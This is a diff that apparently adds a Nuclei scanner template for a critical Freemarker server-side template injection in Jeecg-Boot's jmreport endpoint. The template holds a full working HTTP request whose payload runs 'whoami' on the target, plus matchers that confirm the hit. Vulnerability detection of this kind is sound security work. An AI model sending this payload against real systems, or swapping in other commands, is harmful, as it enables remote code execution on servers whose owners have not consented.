@@ -1,0 +1,25 @@
+id: jeecg-boot-ssti-rce
+
+info:
+  name: Jeecg-Boot SSTI 远程命令执行
+  author: SleepingBag945
+  severity: critical
+  description: |
+    Jeecg-Boot Freemarker 模版注入漏洞
+  metadata:
+  tags: jeecg
+
+http:
+  - raw:
+      - |
+        POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"sql":"select '<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"whoami\")}'"}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && contains(body_1,"解析成功") && contains(body_1,"fieldList") && contains(body_1,"fieldText")
+        condition: and
